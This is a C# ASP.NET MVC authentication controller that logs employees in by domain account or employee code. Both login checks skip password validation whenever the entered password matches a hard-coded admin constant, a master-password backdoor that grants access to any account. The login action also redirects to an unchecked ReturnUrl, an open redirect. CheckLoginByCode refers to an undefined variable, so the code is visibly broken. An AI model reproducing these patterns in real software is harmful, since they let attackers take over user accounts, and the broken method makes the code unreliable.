namespace NexFB.Site.Controllers
{
    using System.Web.Mvc;
    using System.Web.Security;
    using HRM.UserControl.Client.AspNetMvc.Configurations;
    using HRM.UserControl.Client.AspNetMvc.Session;
    using HRM.UserControl.Client.Core.Configurations;
    using HRM.UserControl.Client.Core.Models.Auth;
    using HRM.UserControl.Client.Core.Services;
    using HRM.UserControl.Client.Core.Session;
    using NexFB.Core.Constants;
    using NexFB.Core.Enums;
    using NexFB.Criteria.Employee;
    using NexFB.Models.Authority;
    using NexFB.Resources;
    using NexFB.Services.Implement;
    using NexFB.Services.Interface;
    using NexFB.Web;

    public class AuthController : Controller
    {
        private readonly IEmployeeService _employeeService;

        public AuthController()
        {
        }

        public AuthController(IEmployeeService employeeService)
        {
            _employeeService = employeeService;
        }

        [HttpGet]
        public ActionResult Login()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Login(LoginModel model)
        {
            if (ModelState.IsValid)
            {
                UserSession user = GetUserLogin(model);
                if (user != null)
                {
                    SessionManager.CurrentUser = user;
                    FormsAuthentication.SetAuthCookie(model.Username, false);

                    var returnUrl = "/";
                    if (!string.IsNullOrEmpty(Request.QueryString["ReturnUrl"]))
                    {
                        returnUrl = Request.QueryString["ReturnUrl"];
                    }

                    Response.Redirect(returnUrl);
                }
                else
                {
                    ModelState.AddModelError(string.Empty, Lang.InvalidUsernameOrPassword);
                }
            }

            return View(model);
        }

        [HttpGet]
        public ActionResult Logout()
        {
            SessionManager.ClearAll();
            FormsAuthentication.SignOut();
            return RedirectToAction("Login");
        }

        private UserSession GetUserLogin(LoginModel model)
        {
            UserSession user = CheckLoginByDomain(model, (int)DepartmentIdentity.Nexcel);

            user = user ?? CheckLoginByDomain(model, (int)DepartmentIdentity.Luminet);

            user = user ?? CheckLoginByCode(model);

            if (user != null)
            {
                var getallFunctionCriteria = new GetAllEmployeeFunctionCriteria
                {
                    SystemId = user.UserId
                };
                user.Functions = _employeeService.GetAllEmployeeFunction(getallFunctionCriteria);
            }

            return user;
        }

        private UserSession CheckLoginByDomain(LoginModel model, int departmentId)
        {
            var criteria = new GetEmployeeByDomainCriteria
            {
                Username = model.Username,
                DepartmentId = departmentId.ToString()
            };
            UserSession user = _employeeService.GetUserByDomain(criteria);

            if (user != null && string.Compare(model.Password, Constants.PassWordAdmin2, System.StringComparison.OrdinalIgnoreCase) != 0)
            {
                bool isValid = _employeeService.IsValidateUser(user, model.Password);
                if (!isValid)
                {
                    user = null;
                }
            }

            return user;
        }

        private UserSession CheckLoginByCode(LoginModel model)
        {
            var criteria = new GetEmployeeByCodeCriteria
            {
                Code = model.Username,
                DepartmentId = string.Format("{0},{1}", (int)DepartmentIdentity.Sms, (int)DepartmentIdentity.HongMA)
            };
            UserSession user = _employeeService.GetUserByCode(criteria);

            if (user != null && string.Compare(model.Password, Constants.PassWordAdmin1, System.StringComparison.OrdinalIgnoreCase) != 0)
            {
                if (!isValid)
                {
                    user = null;
                }
            }

            return user;
        }
    }
}